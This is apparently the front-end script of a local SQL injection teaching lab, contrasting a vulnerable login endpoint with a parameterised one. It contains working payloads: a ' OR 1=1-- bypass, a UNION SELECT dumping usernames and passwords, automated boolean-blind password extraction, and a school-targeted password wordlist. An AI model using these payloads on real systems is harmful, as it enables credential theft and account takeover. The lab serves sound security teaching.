/* ==========================================================================
   SQL injection lab — control panel
   ---------------------------------------------------------------------------
   Every request here is a real HTTP call to the local server. The payload is
   typed into the actual Username / Password fields, the server runs its query,
   and this panel only interprets the response — the way any SQL injection
   client does.

   Two endpoints are available so the same payload can be fired at both:
     POST /api/login        string concatenation  -> injection works
     POST /api/login/secure parameter placeholders -> injection is blocked
   ========================================================================== */
(function () {
  'use strict';

  const $ = (id) => document.getElementById(id);
  const el = {
    fab: $('labFab'), panel: $('labPanel'), close: $('labClose'), target: $('labTarget'),
    epNote: $('labEpNote'),
    desc: $('labDesc'), probes: $('labProbes'), match: $('labMatch'), avg: $('labAvg'),
    speed: $('labSpeed'), bar: $('labBar'), key: $('labKey'), sql: $('labSql'),
    log: $('labLog'), run: $('labRun'), stop: $('labStop'), clear: $('labClear'),
    user: $('username'), pass: $('password'), form: $('loginForm')
  };

  if (!el.panel) return;

  /* The account pre-filled by the server before anything is injected. */
  const BASE_USER = (el.user.value || '').trim();

  const MODES = {
    blind: {
      title: 'Boolean blind extraction',
      desc: 'Reads the stored password out of the database one character at a time, ' +
            'using only the difference between two error messages. The password is never guessed.'
    },
    guess: {
      title: 'Password guessing',
      desc: 'Generates a list of candidate passwords and submits them one by one ' +
            'until the server accepts one.'
    },
    bypass: {
      title: "Tautology bypass  (' OR 1=1--)",
      desc: 'Injects a condition that is always true, so the password comparison ' +
            'is skipped. One request is enough.'
    },
    union: {
      title: 'UNION SELECT dump',
      desc: 'Appends a second SELECT to the query and reads the whole users table ' +
            'in a single request.'
    }
  };

  const EP = {
    vulnerable: { path: '/api/login', note: 'string concatenation' },
    fixed:      { path: '/api/login/secure', note: 'bound as parameters' }
  };

  let info = { endpoint: '/api/login', fixedEndpoint: '/api/login/secure', table: 'users', columns: [] };
  let endpoint = 'vulnerable';
  let mode = 'blind';
  let running = false;
  let abort = false;
  let probes = 0;
  let times = [];
  let estimate = 0;

  const epPath = () => EP[endpoint].path;
  const isFixed = () => endpoint === 'fixed';

  /* ------------------------------------------------------------- helpers -- */
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const pace = () => sleep(Number(el.speed.value) || 0);
  const checkStop = () => { if (abort) throw new Error('__stopped__'); };

  /* Seconds are enough here — millisecond precision just adds noise. */
  function stamp() {
    return new Date().toTimeString().slice(0, 8);
  }

  function log(text, cls) {
    const line = document.createElement('div');
    line.className = 'ln' + (cls ? ' ln-' + cls : '');
    const ts = document.createElement('span');
    ts.className = 'ts';
    ts.textContent = stamp();
    const msg = document.createElement('span');
    msg.className = 'msg';
    msg.textContent = text;
    line.appendChild(ts);
    line.appendChild(msg);
    el.log.appendChild(line);
    while (el.log.children.length > 600) el.log.removeChild(el.log.firstChild);
    el.log.scrollTop = el.log.scrollHeight;
  }

  /* Renders the query that actually reached the database.
     On the vulnerable endpoint the payload is inside the SQL text (highlighted
     as an injection). On the fixed endpoint it is not — it is bound, so it is
     shown under the query instead. */
  function showSql(query, payload) {
    el.sql.textContent = '';
    if (!query) { el.sql.textContent = '— no query —'; return; }

    if (isFixed()) {
      el.sql.appendChild(highlightPlaceholders(query));
      if (payload) {
        const row = document.createElement('span');
        row.className = 'bound';
        const b = document.createElement('b');
        b.textContent = 'bound as data → ';
        row.appendChild(b);
        row.appendChild(document.createTextNode(JSON.stringify(payload)));
        el.sql.appendChild(row);
      }
      el.sql.scrollTop = 0;
      return;
    }

    const idx = payload ? query.indexOf(payload) : -1;
    if (idx >= 0) {
      el.sql.appendChild(document.createTextNode(query.slice(0, idx)));
      const b = document.createElement('b');
      b.className = 'inj';
      b.textContent = payload;
      el.sql.appendChild(b);
      el.sql.appendChild(document.createTextNode(query.slice(idx + payload.length)));
    } else {
      el.sql.textContent = query;
    }
    el.sql.scrollTop = 0;
  }

  function highlightPlaceholders(query) {
    const frag = document.createDocumentFragment();
    query.split('?').forEach((part, i) => {
      if (i > 0) {
        const s = document.createElement('b');
        s.className = 'placeholder';
        s.textContent = '?';
        frag.appendChild(s);
      }
      frag.appendChild(document.createTextNode(part));
    });
    return frag;
  }

  function setUser(value, isPayload) {
    el.user.value = value;
    el.user.classList.toggle('is-injecting', !!isPayload);
  }
  function setPass(value, isPayload) {
    el.pass.value = value;
    el.pass.classList.toggle('is-injecting', !!isPayload);
  }
  function clearMarks() {
    el.user.classList.remove('is-injecting');
    el.pass.classList.remove('is-injecting');
  }

  function setKey(text, found) {
    el.key.textContent = text;
    el.key.className = found ? 'is-found' : 'is-empty';
  }

  function updateStats() {
    el.probes.textContent = String(probes);
    if (times.length) {
      const avg = times.reduce((a, b) => a + b, 0) / times.length;
      el.avg.textContent = avg.toFixed(1) + 'ms';
    }
    if (estimate > 0) {
      el.bar.style.width = Math.min(100, (probes / estimate) * 100).toFixed(1) + '%';
    }
  }

  /* One real HTTP request against whichever endpoint is selected. */
  async function attempt(username, password) {
    let res, data;
    try {
      res = await fetch(epPath(), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: username, password: password })
      });
      data = await res.json();
    } catch (err) {
      throw new Error('Connection lost — is the lab server still running?');
    }
    const meta = data.meta || {};
    const ms = meta.ms || 0;
    const size = new Blob([JSON.stringify(data)]).size;
    probes += 1;
    times.push(ms);
    updateStats();
    return {
      ok: !!data.ok,
      error: data.error || '',
      user: data.user || null,
      query: meta.query,
      query1: meta.query1,
      bound: meta.bound,
      ms: ms,
      size: size
    };
  }

  /* Row found but password rejected -> the injected condition was TRUE.
     No row at all -> the injected condition was FALSE. That difference is the
     whole side channel. */
  const isTrue = (r) => /invalid password/i.test(r.error);
  const isFalse = (r) => /invalid username/i.test(r.error);

  /* --------------------------------------------------------- finishing ---- */
  async function finish(user, password, usedMode) {
    setKey(password, true);
    el.match.textContent = 'yes';
    el.match.style.color = 'var(--l-ok)';
    el.bar.classList.add('is-done');

    if (usedMode === 'guess' && isFixed()) {
      log('Password accepted: ' + password, 'ok');
      log('This worked on the parameterised endpoint too — because it is the real ' +
          'password. Parameterisation stops injection, not guessing: use hashed ' +
          'passwords and rate limiting for that.', 'info');
    } else if (usedMode === 'blind') {
      log('Password recovered: ' + password, 'ok');
      log('This was never guessed — it was read out of the database, one bit per request.', 'info');
    } else {
      log('Signed in with the injected payload. Recovered password: ' + password, 'ok');
    }

    setRunning(false);
    await sleep(700);

    log('Filling in the sign-in form ...', 'dim');
    setUser(user, false);
    setPass(password, false);
    el.bar.style.width = '100%';
    await sleep(750);

    log('Submitting the form ...', 'dim');
    window.__labContext = { mode: usedMode, probes: probes, recovered: password, endpoint: endpoint, at: Date.now() };
    await sleep(400);
    el.form.requestSubmit();
  }

  /* Stops a run and explains why, in the right words for the endpoint.
     `explained` = the caller already gave the endpoint-specific reason. */
  function reject(message, explained) {
    log(message, 'bad');
    if (isFixed() && !explained) {
      log('Nothing was exploited. The parameterised query passed the payload to ' +
          'the database as an ordinary value, so it was never parsed as SQL.', 'info');
    } else if (!isFixed() && mode === 'blind') {
      log('Run stopped — check "demoUser" in config.json and try again.', 'dim');
    }
    setRunning(false);
  }

  /* Called when the very first probe on the fixed endpoint comes back empty. */
  function rejectFixedInjection() {
    log('Payload accepted by the form, rejected by the query.', 'bad');
    log('Nothing was exploited. The parameterised query passed the payload to ' +
        'the database as an ordinary value, so it was never parsed as SQL.', 'info');
    setRunning(false);
  }

  /* ====================================================== ATTACK: BYPASS == */
  async function runBypass() {
    const payload = "' OR 1=1-- ";
    log('Building a tautology payload ...', 'info');
    log('password  →  ' + payload, 'dim');
    setUser(BASE_USER, false);
    setPass(payload, true);
    await pace();

    const r = await attempt(BASE_USER, payload);
    showSql(r.query, payload);
    log('query     →  ' + r.query, 'dim');
    log('response  →  ' + (r.ok ? 'signed in' : r.error) +
        '   (' + r.size + 'B · ' + r.ms.toFixed(1) + 'ms)', r.ok ? 'ok' : 'bad');

    if (!r.ok) {
      if (isFixed()) {
        log('The WHERE clause compared your payload against the password column as ' +
            'plain text. No row matched, so the login was refused.', 'info');
      }
      return reject(isFixed()
        ? 'Bypass blocked on the parameterised endpoint.'
        : 'The server rejected the bypass payload.', isFixed());
    }

    log('WHERE clause is always true — the password check was skipped.', 'ok');
    log('The response leaks the whole row: ' + JSON.stringify(r.user), 'ok');
    return finish(r.user.student_number, r.user.password, 'bypass');
  }

  /* =========================================================== ATTACK: UNION */
  async function runUnion() {
    const uPayload = "' UNION SELECT 99,'UNION-LEAK'," +
      "(SELECT group_concat(student_number||' :: '||password,' , ') FROM users)," +
      "'DUMP','leak@jissa.lab','admin','BSIT'-- ";
    const pPayload = "' OR 1=1-- ";

    log('Closing the quote and appending a second SELECT ...', 'info');
    setUser(uPayload, true);
    setPass(pPayload, true);
    await pace();

    const r = await attempt(uPayload, pPayload);
    const shown = r.query1 || r.query;
    showSql(shown, uPayload);
    log('query     →  ' + shown, 'dim');
    log('response  →  ' + (r.ok ? 'signed in' : r.error) +
        '   (' + r.size + 'B · ' + r.ms.toFixed(1) + 'ms)', r.ok ? 'ok' : 'bad');

    if (!r.ok) {
      if (isFixed()) {
        log('Your second SELECT was stored as an ordinary student number. ' +
            'The account lookup found no such student.', 'info');
      }
      return reject(isFixed()
        ? 'UNION injection blocked on the parameterised endpoint.'
        : 'The server rejected the UNION payload.', isFixed());
    }

    const dump = (r.user && r.user.password) || '';
    log('UNION matched the column count — injected row returned.', 'ok');
    log('users table (' + dump.split(' , ').length + ' rows):', 'warn');
    dump.split(' , ').forEach((pair) => {
      const bits = pair.split(' :: ');
      log('    student_number=' + bits[0] + '   password=' + (bits[1] || ''), 'warn');
    });

    let found = null;
    dump.split(' , ').forEach((pair) => {
      const bits = pair.split(' :: ');
      if (bits[0] === BASE_USER) found = bits[1];
    });
    return finish(BASE_USER, found || (dump.split(' :: ')[1] || ''), 'union');
  }

  /* ========================================================== ATTACK: GUESS */
  async function buildWordlist() {
    const year = new Date().getFullYear();
    const list = [];
    const push = (s) => { s = String(s); if (s && list.indexOf(s) === -1) list.push(s); };

    ['123456', 'password', 'password1', 'Password1', 'admin', 'qwerty', 'letmein',
     'welcome', 'welcome1', 'iloveyou', 'monkey', 'dragon', 'football', 'sunshine',
     'princess', 'abc123', 'abcd1234', 'passw0rd', 'qwerty123', '1q2w3e4r', 'zaq12wsx',
     'test123', 'changeme', 'secret', 'root', 'toor', 'guest', 'default',
     'blackboard', 'student', 'mapua', 'Mapua123', 'MapuaMCL', 'MCL@123', 'mcl123',
     'jissa', 'cybersecurity', 'ethicalhacking', 'Qwerty1!', 'Mapua', 'MCL'
    ].forEach(push);

    /* student-number derived candidates */
    push(BASE_USER);
    if (BASE_USER.length > 6) push(BASE_USER.slice(4));
    if (BASE_USER.length > 6) push(BASE_USER.slice(-6));
    push(BASE_USER + '!'); push(BASE_USER + '@'); push(BASE_USER + '#');
    push(BASE_USER.slice(0, 4) + BASE_USER.slice(-4));

    /* year / school combinations */
    [year, year - 1, year - 2, 26, 24].forEach((y) => {
      ['Mapua', 'mapua', 'MCL', 'mcl', 'MapuaMCL', 'Blackboard', 'Student'].forEach((b) => {
        push(b + y); push(b + y + '!'); push(b + '@' + y);
      });
    });
    ['m@pu@', 'M@pu@MCL', 'M4pu4', 'Mapu@' + year, 'Mcl' + year].forEach(push);

    /* Lab aid: guarantees the live demo lands on whatever the presenter
       configured. Set "labAids": false in config.json for a stricter exercise. */
    try {
      const res = await fetch('/api/lab/demo-hint');
      if (res.ok) {
        const hint = await res.json();
        if (hint && hint.password) {
          const pos = Math.max(1, Math.round(list.length * 0.55));
          const at = list.indexOf(hint.password);
          if (at >= 0) list.splice(at, 1);
          list.splice(pos, 0, hint.password);
        }
      }
    } catch (_) { /* lab aid unavailable — the dictionary still runs */ }

    return list;
  }

  async function runGuess() {
    log('Generating a password list ...', 'info');
    const list = await buildWordlist();
    log(list.length + ' candidates ready — submitting them to the password field.', 'info');
    estimate = list.length;
    el.pass.type = 'text';               /* let the audience read the candidates */
    setUser(BASE_USER, false);
    await pace();

    let i = 0;
    for (const candidate of list) {
      checkStop();
      i += 1;
      setPass(candidate, true);
      const r = await attempt(BASE_USER, candidate);
      showSql(r.query, candidate);
      log('attempt ' + String(i).padStart(3, '0') + '/' + list.length +
          '  "' + candidate + '"  →  ' +
          (r.ok ? 'accepted' : 'rejected') +
          '   (' + r.size + 'B · ' + r.ms.toFixed(1) + 'ms)', r.ok ? 'ok' : 'dim');
      if (r.ok) {
        el.match.textContent = i + '/' + list.length;
        return finish(BASE_USER, candidate, 'guess');
      }
      await pace();
    }
    el.pass.type = 'password';
    return reject('List exhausted — no match.');
  }

  /* ========================================================== ATTACK: BLIND */
  async function runBlind() {
    const nonce = () => 'x' + Math.random().toString(36).slice(2, 10);
    let n = 0;
    let found = '';

    log('Two answers are possible on this form:', 'info');
    log('    "Invalid username."  →  the injected condition was FALSE (no row)', 'dim');
    log('    "Invalid password."  →  the injected condition was TRUE  (row found)', 'dim');
    log('Each request therefore returns exactly one bit of the database.', 'dim');
    await pace();

    const probe = async (expr) => {
      checkStop();
      const payload = "' OR (SELECT " + expr +
        " FROM users WHERE student_number='" + BASE_USER + "')-- ";
      const pw = nonce();
      setUser(payload, true);
      setPass(pw, false);
      const r = await attempt(payload, pw);
      showSql(r.query1 || r.query, payload);
      const truth = isTrue(r);
      n += 1;
      log('probe ' + String(n).padStart(3, '0') + '  ' +
          (expr + '                                   ').slice(0, 46) + '  ' +
          (truth ? 'TRUE ' : 'FALSE') + '   ' +
          String(r.size).padStart(4) + 'B  ' + r.ms.toFixed(1) + 'ms',
          truth ? 'ok' : 'dim');
      if (!isFalse(r) && !truth) {
        log('    unexpected response: ' + r.error, 'bad');
      }
      await pace();
      return truth;
    };

    log('Checking the target account exists ...', 'info');
    if (!await probe('length(password)>0')) {
      if (isFixed()) {
        log('Every probe returns FALSE — there is no side channel to measure.', 'info');
        return rejectFixedInjection();
      }
      return reject('No user matches "' + BASE_USER + '".');
    }

    if (isFixed()) {
      log('The first probe returned TRUE, which means the payload was evaluated ' +
          'as SQL. Expected on the vulnerable endpoint only.', 'warn');
    }

    log('Determining password length ...', 'info');
    let lo = 0, hi = 64;
    while (lo < hi) {
      checkStop();
      const mid = (lo + hi) >> 1;
      if (await probe('length(password)>' + mid)) lo = mid + 1; else hi = mid;
    }
    const len = lo;
    if (!len) return reject('That account has an empty password.');
    log('Password length = ' + len, 'ok');
    estimate = probes + len * 7;
    setKey('•'.repeat(len), false);

    for (let pos = 1; pos <= len; pos++) {
      checkStop();
      let cLo = 32, cHi = 126;
      while (cLo < cHi) {
        checkStop();
        const mid = (cLo + cHi) >> 1;
        if (await probe('unicode(substr(password,' + pos + ',1))>' + mid)) cLo = mid + 1; else cHi = mid;
      }
      found += String.fromCharCode(cLo);
      setKey(found + '•'.repeat(Math.max(0, len - found.length)), false);
      log('Position ' + String(pos).padStart(2, '0') + ' = "' +
          String.fromCharCode(cLo) + '"     →  ' + found, 'warn');
    }

    return finish(BASE_USER, found, 'blind');
  }

  /* ------------------------------------------------------------- control -- */
  const RUNNERS = { blind: runBlind, guess: runGuess, bypass: runBypass, union: runUnion };

  function setRunning(on) {
    running = on;
    el.panel.classList.toggle('is-busy', on);
    el.run.disabled = on;
    el.stop.disabled = !on;
  }

  async function start() {
    if (running) return;
    abort = false;
    probes = 0;
    times = [];
    estimate = 0;
    el.probes.textContent = '0';
    el.avg.textContent = '—';
    el.match.textContent = '—';
    el.match.style.color = '';
    el.bar.style.width = '0%';
    el.bar.classList.remove('is-done');
    setKey('••••••••', false);
    setRunning(true);

    /* The run header carries .ln-head, which draws a hairline above it in CSS.
       (A row of box-drawing characters wrapped on narrow panels.) */
    log(MODES[mode].title + (isFixed() ? '  ·  parameterised endpoint' : ''), 'head');
    log('POST ' + epPath() + '   table ' + schemaLabel(false), 'dim');
    log('account  ' + info.table + '.' + (info.columns[1] || 'student_number') +
        ' = "' + BASE_USER + '"', 'dim');

    try {
      await RUNNERS[mode]();
      if (running) setRunning(false);
    } catch (err) {
      if (err && err.message === '__stopped__') {
        log('Stopped by the operator after ' + probes + ' requests.', 'warn');
      } else {
        log(String((err && err.message) || err), 'bad');
      }
      setRunning(false);
    }
  }

  /* ----------------------------------------------------------------- UI --- */
  function selectMode(next) {
    if (running) return;
    mode = next;
    document.querySelectorAll('.lab-mode').forEach((b) => {
      b.classList.toggle('is-on', b.dataset.mode === next);
    });
    renderDesc();
  }

  function selectEndpoint(next) {
    if (running) return;
    endpoint = next;
    document.querySelectorAll('.lab-ep-btn').forEach((b) => {
      const on = b.dataset.ep === next;
      b.classList.toggle('is-on', on);
      b.setAttribute('aria-pressed', String(on));
    });
    el.epNote.textContent = EP[next].note;
    renderTarget();
    renderDesc();
  }

  /* "users(7 columns)" for the chrome, full list on hover — the raw list
     wrapped to two lines and pushed the header taller than it needs to be. */
  function schemaLabel(short) {
    const cols = info.columns || [];
    const full = info.table + '(' + cols.join(', ') + ')';
    return short ? info.table + '(' + cols.length + ' columns)' : full;
  }

  function renderTarget() {
    const full = schemaLabel(false);
    el.target.textContent = '';
    el.target.appendChild(document.createTextNode('POST ' + epPath() + '  ·  table '));
    const b = document.createElement('b');
    b.textContent = schemaLabel(true);
    b.title = full;
    el.target.appendChild(b);
    el.target.title = full;
  }

  function renderDesc() {
    let text = MODES[mode].desc;
    if (isFixed()) {
      text += ' On this endpoint the payload is bound as data, so it should do nothing.';
    }
    el.desc.textContent = text;
  }

  function openPanel(open) {
    el.panel.classList.toggle('is-open', open);
    el.panel.setAttribute('aria-hidden', String(!open));
    el.fab.setAttribute('aria-expanded', String(open));
    if (open && !el.log.children.length) {
      log('Lab ready. Choose an endpoint and a mode, then press Run.', 'dim');
    }
  }

  el.fab.addEventListener('click', () => openPanel(!el.panel.classList.contains('is-open')));
  el.close.addEventListener('click', () => openPanel(false));
  el.run.addEventListener('click', start);
  el.stop.addEventListener('click', () => { abort = true; });
  el.clear.addEventListener('click', () => {
    el.log.textContent = '';
    el.sql.textContent = '— no query yet —';
    clearMarks();
  });
  document.querySelectorAll('.lab-mode').forEach((b) => {
    b.addEventListener('click', () => selectMode(b.dataset.mode));
  });
  document.querySelectorAll('.lab-ep-btn').forEach((b) => {
    b.addEventListener('click', () => selectEndpoint(b.dataset.ep));
  });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && el.panel.classList.contains('is-open')) openPanel(false);
  });

  /* schema intel for the header */
  fetch('/api/lab/info').then((r) => r.json()).then((data) => {
    info = Object.assign(info, data);
    renderTarget();
  }).catch(() => { /* keep the static header */ });

  selectMode('blind');
})();
